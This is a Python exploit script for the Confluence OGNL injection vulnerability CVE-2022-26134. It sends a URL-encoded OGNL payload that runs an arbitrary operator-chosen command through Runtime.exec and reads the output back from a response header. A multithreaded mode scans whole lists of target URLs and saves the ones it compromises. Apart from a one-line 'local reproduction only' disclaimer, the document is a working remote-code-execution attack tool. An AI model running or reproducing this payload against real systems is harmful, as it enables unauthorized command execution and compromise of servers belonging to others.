# author:"404_fu"
# date:2024-03-23 22:44

import time
import concurrent.futures
import colorama
import argparse
import textwrap
import requests
import threading
requests.packages.urllib3.disable_warnings()


def title():
    print(colorama.Fore.BLUE+'[+]  功  能: Confluence OGNL 注入漏洞（CVE-2022-26134）检测')
    print(colorama.Fore.RED+'[+]  警  告: 漏洞仅限本地复现使用,请遵守网络安全法律法规,违者使用与本程序开发者无关\n')

def payload(url, cmd):

#1.请求

    full_url = f"{url}/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22{cmd}%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/"
    # cookie和headers可以去掉
    cookies = {"JSESSIONID": "A85CF0178F6A72F038EB010EBF2D4647"}
    headers = {"Cache-Control": "max-age=0",
               "Sec-Ch-Ua": "\".Not/A)Brand\";v=\"99\", \"Google Chrome\";v=\"103\", \"Chromium\";v=\"103\"",
               "Sec-Ch-Ua-Mobile": "?0", "Sec-Ch-Ua-Platform": "\"Windows\"",
               "Upgrade-Insecure-Requests": "1",
               "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36",
               "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
               "Sec-Fetch-Site": "none", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1",
               "Sec-Fetch-Dest": "document", "Accept-Encoding": "gzip, deflate",
               "Accept-Language": "zh-CN,zh;q=0.9,ja;q=0.8"}
    try:
        response = requests.get(full_url, headers=headers, cookies=cookies,verify=False, allow_redirects=False,
                                timeout=7)
        # 2.响应验证
        if (response.status_code == 302):
            print(colorama.Fore.YELLOW + f"[+]{url}的{cmd}命令执行的回显为:\n{response.headers['X-Cmd-Response']}")
            return True
        else:
            print(f"[-]{url} 不存在漏洞")
    except Exception:
        print(f"[-]{url} 请求失败")
        return False

def create_callback(url_to_scan, res_lst_lock, res_lst):
    def callback(future):
        nonlocal url_to_scan
        try:
            # 获取future的结果
            result = future.result()
            # 如果payload返回True，表示存在弱口令，则将URL添加到结果列表中
            if result:
                with res_lst_lock:
                    res_lst.append(url_to_scan)
        except Exception as e:
            # 处理异常
            print(f"Error occurred while processing {url_to_scan}: {e}")
    return callback

def main(file, output, num, url=None, cmd="id"):
    start_time = time.time()
    res_lst = []  # 初始化结果列表
    res_lst_lock = threading.Lock()  # 添加锁来保证线程安全

    # 如果提供了单个URL，则直接扫描该URL
    if url:
        if payload(url,cmd):
            res_lst.append(url)
    else:
        with concurrent.futures.ThreadPoolExecutor(max_workers=num) as executor:
            with open(file, mode="r", encoding="utf-8") as f:
                for line in f:
                    url_to_scan = line.strip()
                    future = executor.submit(payload, url_to_scan, cmd)
                    future.add_done_callback(create_callback(url_to_scan, res_lst_lock, res_lst))
    # 将结果写入输出文件
    with open(output, mode="w", encoding="utf-8") as f:
        for url in res_lst:
            f.write(f"{url}\n")
    print(colorama.Fore.CYAN+f"任务结束总耗时: {time.time() - start_time} s")

if __name__ == '__main__':
    colorama.init(autoreset=True)
    banner = """
  ______     _______     ____   ___ ____  ____      ____   __   _ _____ _  _   
 / ___\ \   / / ____|   |___ \ / _ \___ \|___ \    |___ \ / /_ / |___ /| || |  
| |    \ \ / /|  _| _____ __) | | | |__) | __) |____ __) | '_ \| | |_ \| || |_ 
| |___  \ V / | |__|_____/ __/| |_| / __/ / __/_____/ __/| (_) | |___) |__   _|
 \____|  \_/  |_____|   |_____|\___/_____|_____|   |_____|\___/|_|____/   |_|                                 
                                                                 
                                                                 Author：404_fu                                                             
    """
    print(colorama.Fore.GREEN+banner)
    title()
    # 使用argparse去解析命令行传来的参数
    parser = argparse.ArgumentParser(description="CVE-2022-26134 exp",
                            formatter_class=argparse.RawDescriptionHelpFormatter,
                            epilog=textwrap.dedent('''example:
            python CVE-2022-26134.py -u http://127.0.0.1 -c id
            python CVE-2022-26134.py -f url.txt -o res.txt -n 30 -c id
        '''))
    # 添加参数
    parser.add_argument("-f", "--file", dest="file", type=str, help="input file path")
    parser.add_argument("-o", "--output", dest="output", type=str, help="save file path", default="res.txt")
    parser.add_argument("-n", "--num", dest="num", type=int, help="thread num", default=20)
    parser.add_argument("-u", "--url", dest="url", type=str, help="input a url")
    parser.add_argument("-c", "--cmd", dest="cmd", type=str, help="input a cmd", default="id")
    # 把参数的值解析到对象中
    args = parser.parse_args()
    # 调用main函数，传入url参数（如果有的话）
    if args.url:
        main(None, args.output, args.num, url=args.url, cmd=args.cmd)
    else:
        main(args.file, args.output, args.num, cmd=args.cmd)